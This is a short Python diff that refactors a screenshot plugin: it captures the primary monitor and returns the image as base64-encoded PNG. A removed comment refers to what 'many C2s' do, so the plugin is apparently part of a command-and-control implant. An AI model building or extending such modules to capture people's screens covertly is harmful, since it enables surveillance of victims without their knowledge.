@@ -1,6 +1,3 @@
-import base64
-import io
-from mss import mss
 try:
     from .base import BasePlugin
 except (ImportError, ValueError):
@@ -14,15 +11,18 @@ class ScreenshotPlugin(BasePlugin):
     def execute(self, payload: Dict[str, Any]) -> Dict[str, Any]:
         """Captures a screenshot of the primary monitor."""
         try:
-            with mss() as sct:
-                # Get raw pixels from the first monitor
-                monitor = sct.monitors[1]
+            import mss
+            import mss.tools
+            import base64
+            
+            with mss.mss() as sct:
+                if not sct.monitors:
+                    return {"status": "error", "error": "No monitors detected"}
+                
+                # Get raw pixels (index 1 is first monitor, 0 is all monitors combined)
+                monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
                 sct_img = sct.grab(monitor)
                 
-                # Convert to PNG using internal mss tools or just use the raw bytes
-                # For better compatibility/quality control, we'll use zlib compressed data 
-                # but many C2s just use a quick PNG save to memory.
-                import mss.tools
                 img_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
                 
                 encoded = base64.b64encode(img_bytes).decode('utf-8')
